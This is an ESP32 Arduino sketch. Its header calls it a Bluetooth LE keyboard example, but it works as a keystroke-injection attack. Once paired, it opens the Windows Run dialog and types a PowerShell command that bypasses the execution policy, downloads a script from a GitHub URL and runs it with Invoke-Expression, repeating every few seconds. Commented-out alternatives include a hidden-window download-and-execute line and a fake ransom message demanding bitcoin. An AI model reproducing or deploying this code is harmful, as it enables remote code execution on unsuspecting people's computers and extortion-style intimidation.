/**
 * This example turns the ESP32 into a Bluetooth LE keyboard that writes the words, presses Enter, presses a media key and then Ctrl+Alt+Delete
 */
#include <BleKeyboard.h>

BleKeyboard bleKeyboard;

void setup() {
  Serial.begin(115200);
  Serial.println("Starting BLE work!");
  bleKeyboard.begin();
}

// char payload [] = "powershell Add-Type -AssemblyName System.speech; $speak = New-Object System.Speech.Synthesis.SpeechSynthesizer; $speak.Speak(\"You Have Been Hack,a crypto locker will execute, send bitcoin to my address now\"); Start-Process \"https://www.youtube.com/embed/xvFZjo5PgG0?autoplay=1\"";
// Bad Power shell char payload [] = "powershell -W Hidden -Exec Bypass $a= Invoke-WebRequest https://chocolatey.org/install.ps1 -UseBasicParsing; Invoke-Expression $a";

char payload [] = "powershell -Exec Bypass $a= Invoke-WebRequest https://raw.githubusercontent.com/jkljkl1197/ArduinoFun/main/FunPayload.ps1 -UseBasicParsing; Invoke-Expression $a";

void loop() {
  if(bleKeyboard.isConnected()) {
    Serial.println("Connected!");
    delay(2000);
    
    Serial.println("Sending 'CTRL + R'");
    bleKeyboard.press(KEY_LEFT_GUI);
    bleKeyboard.press('r');
    delay(100);
    bleKeyboard.releaseAll();
    delay(1000);
    
    Serial.println("Sending payload");
    int len = strlen(payload);
    for (int i=0;i<len;i++) { //inversement des upper case en lower pour un raison inconnue wtf
      bleKeyboard.print((char) payload[i]);
      delay(5);
    }
    
    Serial.println("Sending Return");
    bleKeyboard.press(KEY_RETURN);
    delay(100);
    bleKeyboard.releaseAll();
    Serial.println("Finish");
  } else {
    Serial.println("Not connected");
  }

  Serial.println("Waiting 5 seconds...");
  delay(5000);
}
